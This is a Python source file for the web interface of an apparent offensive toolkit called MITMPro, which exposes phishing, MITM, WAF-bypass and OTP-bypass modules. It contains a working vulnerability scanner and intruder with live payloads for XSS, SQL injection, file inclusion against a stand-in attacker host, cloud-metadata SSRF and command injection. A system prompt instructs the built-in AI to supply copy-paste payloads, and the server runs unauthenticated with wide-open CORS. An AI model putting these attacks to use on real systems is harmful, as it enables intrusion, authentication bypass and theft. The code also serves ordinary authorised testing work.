"""MITMPro Web GUI — Full local web interface.

A FastAPI-based backend that wraps all MITMPro modules and exposes them through
a modern single-page web application. The frontend (static/index.html) provides
a dark-themed enterprise UI with a sidebar navigation mirroring the desktop app,
AI-powered assistance on every module, and full access to all 21 MITMPro tools.

Run:  python -m mitmpro.webgui   (then open http://localhost:5000)
"""
import os
import sys
import json
import time
import threading
import urllib.parse
import urllib.request
from typing import Optional, Dict, Any, List

try:
    from fastapi import FastAPI, HTTPException, Request
    from fastapi.responses import HTMLResponse, JSONResponse, FileResponse
    from fastapi.staticfiles import StaticFiles
    from fastapi.middleware.cors import CORSMiddleware
    import uvicorn
except ImportError:
    print("[!] FastAPI/uvicorn not installed. Run: pip install fastapi uvicorn")
    raise

# Make the package importable when launched directly.
_PROJECT_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if _PROJECT_ROOT not in sys.path:
    sys.path.insert(0, _PROJECT_ROOT)

from mitmpro import common
from mitmpro import ai_core
from mitmpro import knowledge
from mitmpro import scope as scope_module

# --------------------------------------------------------------------------- #
# App setup
# --------------------------------------------------------------------------- #
app = FastAPI(title="MITMPro Web GUI", version="1.0.0")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

_STATIC_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "web_static")
os.makedirs(_STATIC_DIR, exist_ok=True)


# --------------------------------------------------------------------------- #
# Module registry — mirrors the desktop NAV_ITEMS
# --------------------------------------------------------------------------- #
MODULES = [
    {"key": "dashboard", "label": "Dashboard", "icon": "🏠"},
    {"key": "ai", "label": "AI Assistant", "icon": "💬"},
    {"key": "traffic", "label": "AI Traffic Analyst", "icon": "🔍"},
    {"key": "burp", "label": "Burp Tools", "icon": "🛡️"},
    {"key": "websploit", "label": "WebSploit", "icon": "🌐"},
    {"key": "proxy", "label": "Proxy Tools", "icon": "🔀"},
    {"key": "waf", "label": "WAF/Bypass", "icon": "🚧"},
    {"key": "phish", "label": "Website Masquerading", "icon": "🎭"},
    {"key": "dlp", "label": "Inline DLP Proxy", "icon": "🛡️"},
    {"key": "network", "label": "Network Attacks", "icon": "⚡"},
    {"key": "sslstrip", "label": "SSL Strip / MITM", "icon": "🔒"},
    {"key": "campaigns", "label": "Campaign Manager", "icon": "📊"},
    {"key": "email", "label": "Email Engineer", "icon": "✉️"},
    {"key": "helper", "label": "AI Helper", "icon": "🧠"},
    {"key": "history", "label": "HTTP History", "icon": "📜"},
    {"key": "oast", "label": "OAST / DNS", "icon": "📡"},
    {"key": "macro", "label": "Macro / Flow", "icon": "🔁"},
    {"key": "scope", "label": "Scope", "icon": "🎯"},
    {"key": "analysis", "label": "Analysis", "icon": "📊"},
    {"key": "nsniffer", "label": "Nsniffer Toolkit", "icon": "📡"},
    {"key": "autorun", "label": "AI Auto-Run", "icon": "🚀"},
]


# --------------------------------------------------------------------------- #
# Helper functions
# --------------------------------------------------------------------------- #
def _ollama_models():
    try:
        return common.ollama_models()
    except Exception:
        return []


def _ollama_running():
    return common.ollama_running()


# --------------------------------------------------------------------------- #
# Routes — SPA shell
# --------------------------------------------------------------------------- #
@app.get("/", response_class=HTMLResponse)
def index():
    """Serve the single-page app shell."""
    html_path = os.path.join(_STATIC_DIR, "index.html")
    if os.path.isfile(html_path):
        with open(html_path, "r", encoding="utf-8") as f:
            return HTMLResponse(f.read())
    # Minimal fallback if the file is missing
    return HTMLResponse(
        "<!doctype html><html><head><title>MITMPro Web GUI</title></head>"
        "<body><h1>MITMPro Web GUI</h1>"
        "<p>Static index.html not found. Place it in mitmpro/web_static/.</p>"
        "</body></html>")


@app.get("/health")
def health():
    return {
        "status": "ok",
        "ollama_running": _ollama_running(),
        "models": _ollama_models(),
        "selected_model": common.SELECTED_MODEL,
        "internet_enabled": common.INTERNET_ENABLED,
        "scope": list(scope_module.SCOPE),
    }


@app.get("/api/modules")
def get_modules():
    """Return the module registry for the sidebar."""
    return {"modules": MODULES}


@app.get("/api/models")
def get_models():
    return {"models": _ollama_models(), "selected": common.SELECTED_MODEL}


@app.post("/api/models/select")
async def select_model(req: Request):
    data = await req.json()
    model = data.get("model")
    if model:
        common.set_model(model)
    return {"selected": common.SELECTED_MODEL}


@app.get("/api/ollama/health")
def ollama_health():
    return {"running": _ollama_running(), "models": _ollama_models()}


@app.get("/api/scope")
def get_scope():
    return {"scope": list(scope_module.SCOPE)}


@app.post("/api/scope/add")
async def add_scope(req: Request):
    data = await req.json()
    host = data.get("host", "").strip().lower()
    if host and host not in scope_module.SCOPE:
        scope_module.add(host)
    return {"scope": list(scope_module.SCOPE)}


@app.post("/api/scope/remove")
async def remove_scope(req: Request):
    data = await req.json()
    host = data.get("host", "").strip().lower()
    if host in scope_module.SCOPE:
        scope_module.remove(host)
    return {"scope": list(scope_module.SCOPE)}


@app.get("/api/knowledge")
def get_knowledge():
    """Return the full application knowledge base for the AI."""
    return {"knowledge": knowledge.APP_KNOWLEDGE[:20000]}


# --------------------------------------------------------------------------- #
# AI Chat endpoint (streaming via SSE)
# --------------------------------------------------------------------------- #
@app.post("/api/ai/chat")
async def ai_chat(req: Request):
    """Stream an AI chat response using Server-Sent Events."""
    from fastapi.responses import StreamingResponse
    import asyncio

    data = await req.json()
    messages = data.get("messages", [])
    context = data.get("context", "MITMPro")
    rag_query = data.get("rag_query")
    model = data.get("model") or common.SELECTED_MODEL

    if not model:
        models = _ollama_models()
        if models:
            model = models[0]
            common.set_model(model)
        else:
            async def _err():
                yield f"data: {json.dumps({'error': 'No Ollama model available'})}\n\n"
            return StreamingResponse(_err(), media_type="text/event-stream")

    if not messages:
        messages = [{"role": "user", "content": "Hello"}]

    # Prepend system prompt to ground the model
    system_prompt = ai_core.build_system_prompt(context)
    full_messages = [{"role": "system", "content": system_prompt}] + messages

    async def event_stream():
        try:
            result = {"text": ""}
            cancel = threading.Event()

            def on_token(t):
                result["text"] += t
                # SSE format
                yield_data = json.dumps({"token": t})
                # Must use a thread-safe queue to push to asyncio
                queue.put(("token", t))

            def on_done(full):
                queue.put(("done", full))

            def on_error(e):
                queue.put(("error", str(e)))

            import queue as _queue
            queue = _queue.Queue()

            def run_in_thread():
                try:
                    ai_core.stream_chat(
                        model, full_messages,
                        on_token=lambda t: queue.put(("token", t)),
                        on_done=lambda f: queue.put(("done", f)),
                        on_error=lambda e: queue.put(("error", str(e))),
                        context=context,
                        rag_query=rag_query or messages[-1].get("content", ""),
                        cancel_event=cancel,
                    )
                except Exception as e:
                    queue.put(("error", str(e)))

            t = threading.Thread(target=run_in_thread, daemon=True)
            t.start()

            first_token_received = False
            while True:
                timeout = 300 if first_token_received else 120
                try:
                    kind, payload = queue.get(timeout=timeout)
                except _queue.Empty:
                    if not first_token_received:
                        yield f"data: {json.dumps({'error': 'Ollama did not respond within 120s. Is the model loaded?'})}\n\n"
                    else:
                        yield f"data: {json.dumps({'timeout': True})}\n\n"
                    break
                if kind == "token":
                    first_token_received = True
                    yield f"data: {json.dumps({'token': payload})}\n\n"
                elif kind == "done":
                    yield f"data: {json.dumps({'done': True, 'full': payload})}\n\n"
                    break
                elif kind == "error":
                    yield f"data: {json.dumps({'error': payload})}\n\n"
                    break
        except Exception as e:
            yield f"data: {json.dumps({'error': str(e)})}\n\n"

    return StreamingResponse(event_stream(), media_type="text/event-stream")


# --------------------------------------------------------------------------- #
# Burp Tools — Repeater
# --------------------------------------------------------------------------- #
@app.post("/api/burp/repeater/send")
async def burp_repeater_send(req: Request):
    import requests
    data = await req.json()
    method = data.get("method", "GET")
    url = data.get("url", "")
    headers = data.get("headers", {})
    body = data.get("body", "")
    if not url:
        return JSONResponse({"error": "URL required"}, status_code=400)
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    try:
        kwargs = {"headers": headers, "timeout": 15, "verify": False,
                  "allow_redirects": False}
        if method in ("POST", "PUT", "PATCH", "DELETE") and body:
            kwargs["data"] = body
        r = requests.request(method, url, **kwargs)
        out = f"HTTP/1.1 {r.status_code} {r.reason}\n"
        for k, v in r.headers.items():
            out += f"{k}: {v}\n"
        out += f"\n{len(r.content)} bytes\n\n"
        try:
            out += r.text
        except Exception:
            out += repr(r.content[:500])
        return {"response": out, "status": r.status_code}
    except Exception as e:
        return JSONResponse({"error": str(e)}, status_code=500)


# --------------------------------------------------------------------------- #
# Burp Tools — Intruder
# --------------------------------------------------------------------------- #
@app.post("/api/burp/intruder/attack")
async def burp_intruder_attack(req: Request):
    import requests
    import re
    import concurrent.futures
    data = await req.json()
    template = data.get("template", "")
    payloads = data.get("payloads", [])
    mode = data.get("mode", "Sniper")

    markers = re.findall(r"§([^§]+)§", template)
    if not markers:
        return JSONResponse({"error": "No §marker§ found in template"}, status_code=400)

    results = []

    def send_raw(raw):
        try:
            lines = raw.split("\n")
            req_line = lines[0]
            parts = req_line.split(" ", 2)
            if len(parts) < 2:
                return "MALFORMED"
            method = parts[0]
            path = parts[1]
            host = ""
            body = ""
            hdrs = {}
            in_body = False
            for ln in lines[1:]:
                if ln == "":
                    in_body = True
                    continue
                if in_body:
                    body += ln
                elif ":" in ln:
                    k, v = ln.split(":", 1)
                    if k.lower() == "host":
                        host = v.strip()
                    else:
                        hdrs[k.strip()] = v.strip()
            if not host:
                return "NO HOST"
            proto = "https" if ":443" in host else "http"
            url = f"{proto}://{host}{path}"
            r = requests.request(method, url, headers=hdrs, data=body,
                                  timeout=10, verify=False)
            return f"{r.status_code} ({len(r.content)}b)"
        except Exception as e:
            return f"ERR {e}"

    if mode == "Sniper":
        for i, p in enumerate(payloads):
            req = template
            for m in markers:
                req = req.replace(f"§{m}§", p)
            res = send_raw(req)
            results.append({"index": i, "payload": p, "result": res})
    else:
        import itertools
        for combo in itertools.product(payloads, repeat=len(markers)):
            req = template
            for m, p in zip(markers, combo):
                req = req.replace(f"§{m}§", p)
            res = send_raw(req)
            results.append({"payload": list(combo), "result": res})

    return {"results": results}


# --------------------------------------------------------------------------- #
# Burp Tools — Decoder
# --------------------------------------------------------------------------- #
@app.post("/api/burp/decoder")
async def burp_decoder(req: Request):
    import base64
    import binascii
    import urllib.parse
    import html
    data = await req.json()
    text = data.get("text", "")
    fmt = data.get("format", "Base64")
    mode = data.get("mode", "encode")  # encode or decode
    try:
        if mode == "encode":
            if fmt == "Base64":
                res = base64.b64encode(text.encode()).decode()
            elif fmt == "URL":
                res = urllib.parse.quote(text)
            elif fmt == "HTML":
                res = html.escape(text)
            elif fmt == "Hex":
                res = binascii.hexlify(text.encode()).decode()
            else:
                res = " ".join(f"{ord(c):02X}" for c in text)
        else:
            if fmt == "Base64":
                res = base64.b64decode(text).decode("utf-8", "replace")
            elif fmt == "URL":
                res = urllib.parse.unquote(text)
            elif fmt == "HTML":
                res = html.unescape(text)
            elif fmt == "Hex":
                res = binascii.unhexlify(text.replace(" ", "")).decode("utf-8", "replace")
            else:
                res = "".join(chr(int(x, 16)) for x in text.split())
        return {"result": res}
    except Exception as e:
        return JSONResponse({"error": str(e)}, status_code=400)


# --------------------------------------------------------------------------- #
# Burp Tools — Scanner
# --------------------------------------------------------------------------- #
@app.post("/api/burp/scanner/scan")
async def burp_scanner_scan(req: Request):
    import requests
    from bs4 import BeautifulSoup
    import urllib.parse
    import concurrent.futures

    data = await req.json()
    base = data.get("url", "")
    if not base:
        return JSONResponse({"error": "URL required"}, status_code=400)

    checks = data.get("checks", [
        "Reflected XSS", "SQL Injection", "Open Redirect", "LFI/RFI",
        "SSRF", "Command Injection", "Sensitive Files", "CSRF Check",
        "Header Security", "Directory Busting", "CORS Misconfig",
        "Cookie Security", "SSL/TLS Info", "JWT Analysis",
    ])

    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                             "AppleWebKit/537.36 (KHTML, like Gecko) "
                             "Chrome/120.0.0.0 Safari/537.36"}

    try:
        r = requests.get(base, timeout=15, verify=False, headers=headers)
    except Exception as e:
        return JSONResponse({"error": f"Cannot fetch target: {e}"}, status_code=500)

    try:
        soup = BeautifulSoup(r.text, "html.parser")
        forms = soup.find_all("form")
        params = list(urllib.parse.parse_qs(urllib.parse.urlparse(base).query).keys())
        for f in forms:
            for inp in f.find_all("input"):
                n = inp.get("name")
                if n:
                    params.append(n)
    except Exception:
        forms = []
        params = []

    param_set = set(params)
    parsed_url = urllib.parse.urlparse(base)
    findings = []

    def inject(url, param, payload):
        p = urllib.parse.urlparse(url)
        q = urllib.parse.parse_qs(p.query)
        q[param] = payload
        new = p._replace(query=urllib.parse.urlencode(q, doseq=True))
        return urllib.parse.urlunparse(new)

    # Run checks
    def run_check(name):
        local = []
        if name == "Reflected XSS":
            payload = "<script>alert(1)</script>"
            for pname in param_set:
                try:
                    test = inject(base, pname, payload)
                    rr = requests.get(test, timeout=10, verify=False, headers=headers)
                    if payload in rr.text:
                        local.append(f"HIGH: Reflected XSS via '{pname}'")
                except Exception:
                    pass
        elif name == "SQL Injection":
            pls = ["' OR '1'='1", "'; WAITFOR DELAY '0:0:5'--", "') OR 1=1--"]
            for pname in param_set:
                for p in pls:
                    try:
                        test = inject(base, pname, p)
                        start = time.time()
                        rr = requests.get(test, timeout=15, verify=False, headers=headers)
                        if (time.time() - start > 4) or any(
                                x in rr.text.lower() for x in
                                ["sql", "syntax", "mysql", "postgresql", "oracle"]):
                            local.append(f"HIGH: SQLi via '{pname}' using {p}")
                            break
                    except Exception:
                        pass
        elif name == "Open Redirect":
            for pname in param_set:
                try:
                    test = inject(base, pname, "http://evil.com")
                    rr = requests.get(test, timeout=10, verify=False, headers=headers,
                                      allow_redirects=False)
                    if rr.status_code in (301, 302) and "evil.com" in rr.headers.get("Location", ""):
                        local.append(f"MEDIUM: Open Redirect via '{pname}'")
                except Exception:
                    pass
        elif name == "LFI/RFI":
            pls = ["../../../../etc/passwd", "http://attacker.com/shell.txt", "/etc/passwd"]
            for pname in param_set:
                for p in pls:
                    try:
                        test = inject(base, pname, p)
                        rr = requests.get(test, timeout=10, verify=False, headers=headers)
                        if "root:x:0:0" in rr.text or "shell.txt" in rr.text:
                            local.append(f"HIGH: LFI/RFI via '{pname}' using {p}")
                            break
                    except Exception:
                        pass
        elif name == "SSRF":
            pls = ["http://169.254.169.254/latest/meta-data/", "http://localhost:80",
                   "http://127.0.0.1:22"]
            for pname in param_set:
                for p in pls:
                    try:
                        test = inject(base, pname, p)
                        rr = requests.get(test, timeout=10, verify=False, headers=headers)
                        if any(x in rr.text for x in ["instance-id", "SSH-2.0", "root:x:0:0"]):
                            local.append(f"HIGH: SSRF via '{pname}' using {p}")
                            break
                    except Exception:
                        pass
        elif name == "Command Injection":
            pls = ["; id", "| id", "$(id)", "`id`"]
            for pname in param_set:
                for p in pls:
                    try:
                        test = inject(base, pname, p)
                        rr = requests.get(test, timeout=10, verify=False, headers=headers)
                        if "uid=" in rr.text and "gid=" in rr.text:
                            local.append(f"CRITICAL: Command Injection via '{pname}' using {p}")
                            break
                    except Exception:
                        pass
        elif name == "Sensitive Files":
            paths = ["/.git/config", "/.env", "/phpinfo.php", "/robots.txt",
                     "/.htaccess", "/wp-config.php", "/server-status", "/.DS_Store",
                     "/WEB-INF/web.xml", "/sitemap.xml"]
            root_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
            for p in paths:
                try:
                    rr = requests.get(root_url + p, timeout=10, verify=False, headers=headers)
                    if rr.status_code == 200:
                        if any(x in rr.text for x in
                               ["repository", "DB_PASSWORD", "PHP Version",
                                "User-agent", "Disallow", "web-app"]):
                            local.append(f"MEDIUM: Sensitive file: {p}")
                except Exception:
                    pass
        elif name == "CSRF Check":
            for form in forms:
                has_token = False
                for inp in form.find_all("input"):
                    nm = inp.get("name", "").lower()
                    if any(x in nm for x in ["csrf", "token", "xsrf", "auth"]):
                        has_token = True
                        break
                if not has_token:
                    local.append(f"LOW: CSRF in form action '{form.get('action', 'N/A')}'")
        elif name == "Header Security":
            sec_headers = {
                "content-security-policy": "Missing CSP",
                "strict-transport-security": "Missing HSTS",
                "x-frame-options": "Missing X-Frame-Options",
                "x-content-type-options": "Missing X-Content-Type-Options",
                "x-xss-protection": "Missing X-XSS-Protection",
                "referrer-policy": "Missing Referrer-Policy",
            }
            for hdr, desc in sec_headers.items():
                if hdr not in {k.lower() for k in r.headers}:
                    sev = "MEDIUM" if hdr in ("content-security-policy", "strict-transport-security") else "LOW"
                    local.append(f"{sev}: {desc}")
        elif name == "Directory Busting":
            dirs = ["/admin", "/backup", "/config", "/api", "/.git", "/phpmyadmin",
                    "/login", "/dashboard", "/debug", "/test", "/staging",

                "/.env.bak", "/wp-admin", "/server-info", "/cpanel"]
            root_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
            for d in dirs:
                try:
                    rr = requests.get(root_url + d, timeout=8, verify=False, headers=headers,
                                      allow_redirects=False)
                    if rr.status_code == 200 and len(rr.text) > 100:
                        local.append(f"MEDIUM: Directory: {d} (200)")
                    elif rr.status_code in (301, 302, 401, 403):
                        local.append(f"INFO: {d} -> {rr.status_code}")
                except Exception:
                    pass
        elif name == "CORS Misconfig":
            for origin in ["https://evil.com", "https://attacker.com",
                           f"{parsed_url.scheme}://{parsed_url.netloc}"]:
                try:
                    rr = requests.get(base, timeout=10, verify=False,
                                      headers={**headers, "Origin": origin})
                    acao = rr.headers.get("Access-Control-Allow-Origin", "")
                    acac = rr.headers.get("Access-Control-Allow-Credentials", "")
                    if acao == "*" or (acao == origin and acac.lower() == "true"):
                        sev = "HIGH" if acac.lower() == "true" else "MEDIUM"
                        local.append(f"{sev}: CORS ACAO={acao} ACAC={acac}")
                        break
                except Exception:
                    pass
        elif name == "Cookie Security":
            for hdr_val in r.headers.get("Set-Cookie", "").split(","):
                cookie_part = hdr_val.split(";")[0].strip()
                if not cookie_part:
                    continue
                lower = hdr_val.lower()
                flags = []
                if "httponly" not in lower:
                    flags.append("HttpOnly")
                if "secure" not in lower:
                    flags.append("Secure")
                if "samesite" not in lower:
                    flags.append("SameSite")
                if flags:
                    local.append(f"LOW: Cookie '{cookie_part.split('=')[0]}' missing: {', '.join(flags)}")
        elif name == "SSL/TLS Info":
            if parsed_url.scheme == "http":
                local.append("INFO: Target uses HTTP (unencrypted)")
        elif name == "JWT Analysis":
            import base64 as b64
            for cookie_val in r.headers.get("Set-Cookie", "").split(","):
                for part in cookie_val.split(";"):
                    kv = part.strip().split("=", 1)
                    if len(kv) == 2:
                        v = kv[1].strip()
                        segments = v.split(".")
                        if len(segments) == 3:
                            try:
                                b64.urlsafe_b64decode(segments[0] + "=" * (4 - len(segments[0]) % 4))
                                b64.urlsafe_b64decode(segments[1] + "=" * (4 - len(segments[1]) % 4))
                                local.append(f"INFO: JWT in cookie '{kv[0].strip()}'")
                            except Exception:
                                pass
            for pname in param_set:
                val = urllib.parse.parse_qs(urllib.parse.urlparse(base).query).get(pname, [""])[0]
                if val and len(val.split(".")) == 3:
                    local.append(f"INFO: JWT-like in param '{pname}'")
        return local

    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as ex:
        futures = {ex.submit(run_check, name): name for name in checks}
        for fut in concurrent.futures.as_completed(futures):
            name = futures[fut]
            try:
                findings.extend(fut.result())
            except Exception as e:
                findings.append(f"INFO: Check '{name}' error: {e}")

    severity_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
    findings.sort(key=lambda f: severity_order.get(f.split(":")[0].strip(), 5))

    return {
        "findings": findings,
        "total": len(findings),
        "base": base,
        "forms": len(forms),
        "params": len(param_set),
    }


# --------------------------------------------------------------------------- #
# OTP Bypass Tools — forward to the existing module
# --------------------------------------------------------------------------- #
@app.get("/api/otp/techniques")
def otp_techniques():
    """List available OTP bypass techniques."""
    try:
        from mitmpro import otp_bypass_tools
        techs = otp_bypass_tools.get_all_techniques()
        return {"techniques": list(techs.keys())}
    except Exception as e:
        return JSONResponse({"error": str(e)}, status_code=500)


@app.post("/api/otp/run")
async def otp_run(req: Request):
    """Run a specific OTP bypass technique."""
    import requests
    data = await req.json()
    technique = data.get("technique", "")
    target_url = data.get("target_url", "")
    username = data.get("username", "")
    password = data.get("password", "")

    try:
        from mitmpro import otp_bypass_tools
        session = requests.Session()
        session.verify = False
        try:
            result = otp_bypass_tools.run_technique(
                technique, target_url, session,
                username=username, password=password)
            return {"result": str(result)}
        except Exception as e:
            return JSONResponse({"error": str(e)}, status_code=500)
    except Exception as e:
        return JSONResponse({"error": str(e)}, status_code=500)


# --------------------------------------------------------------------------- #
# WAF Bypass — forward to existing module
# --------------------------------------------------------------------------- #
@app.post("/api/waf/generate")
async def waf_generate(req: Request):
    try:
        from mitmpro import waf_engine
        data = await req.json()
        payload = data.get("payload", "")
        category = data.get("category", "SQLi")
        variants = waf_engine.generate_variants(payload, category)
        scored = sorted(variants, key=lambda v: waf_engine.score_variant(v), reverse=True)
        return {"variants": scored[:50], "total": len(scored)}
    except Exception as e:
        return JSONResponse({"error": str(e)}, status_code=500)


# --------------------------------------------------------------------------- #
# AI Traffic Analyst
# --------------------------------------------------------------------------- #
@app.post("/api/traffic/analyze")
async def traffic_analyze(req: Request):
    import asyncio
    data = await req.json()
    req_text = data.get("request", "")
    resp_text = data.get("response", "")
    action = data.get("action", "Find vulnerabilities")

    model = common.SELECTED_MODEL
    if not model:
        models = _ollama_models()
        if models:
            model = models[0]
            common.set_model(model)

    if not model:
        return JSONResponse({"error": "No Ollama model"}, status_code=400)

    prompt = (f"Action requested: {action}\n\n=== REQUEST ===\n{req_text}\n")
    if resp_text:
        prompt += f"\n=== RESPONSE ===\n{resp_text}\n"

    messages = [
        {"role": "system", "content": (
            "You are a senior web-application security analyst embedded in MITMPro. "
            "Given a raw HTTP request/response, explain it, identify OWASP Top 10 "
            "vulnerabilities with evidence, and propose concrete copy-paste payloads. "
            "Be precise, technical, reference exact lines/parameters.")},
        {"role": "user", "content": prompt},
    ]

    collected = {"text": ""}

    def on_token(t):
        collected["text"] += t

    def on_done(full):
        pass

    def on_error(e):
        pass

    try:
        text = await asyncio.to_thread(
            ai_core.stream_chat, model, messages,
            on_token=on_token, context="AI Traffic Analyst", rag_query=prompt)
        collected["text"] = collected["text"] or text
    except Exception as e:
        return JSONResponse({"error": str(e)}, status_code=500)

    return {"analysis": collected["text"]}


# --------------------------------------------------------------------------- #
# Scope
# --------------------------------------------------------------------------- #
@app.get("/api/scope/full")
def scope_full():
    return {"scope": list(scope_module.SCOPE),
            "count": len(scope_module.SCOPE)}


# --------------------------------------------------------------------------- #
# Analysis
# --------------------------------------------------------------------------- #
@app.get("/api/analysis")
def analysis():
    import os
    folders = [
        ("ollama-gui-1.2.2", os.path.join(common.PROJECT_ROOT, "ollama-gui-1.2.2")),
        ("websploit-4.0.4", os.path.join(common.PROJECT_ROOT, "websploit-4.0.4")),
        ("mitmnew", os.path.join(common.PROJECT_ROOT, "mitmnew")),
        ("mitmpro", os.path.join(common.PROJECT_ROOT, "mitmpro")),
    ]
    result = []
    for name, path in folders:
        if os.path.isdir(path):
            py = 0
            total = 0
            for root, dirs, files in os.walk(path):
                for f in files:
                    total += 1
                    if f.endswith(".py"):
                        py += 1
            result.append({"name": name, "status": "PRESENT", "files": total, "python": py})
        else:
            result.append({"name": name, "status": "MISSING", "files": 0, "python": 0})
    return {"folders": result, "ollama_models": _ollama_models()}


# --------------------------------------------------------------------------- #
# Static files
# --------------------------------------------------------------------------- #
if os.path.isdir(_STATIC_DIR):
    app.mount("/static", StaticFiles(directory=_STATIC_DIR), name="static")


def main():
    """Entry point: python -m mitmpro.webgui"""
    port = int(os.environ.get("MITMPRO_WEB_PORT", "5000"))
    print(f"[*] MITMPro Web GUI starting on http://localhost:{port}")
    uvicorn.run(app, host="0.0.0.0", port=port, log_level="info")


if __name__ == "__main__":
    main()
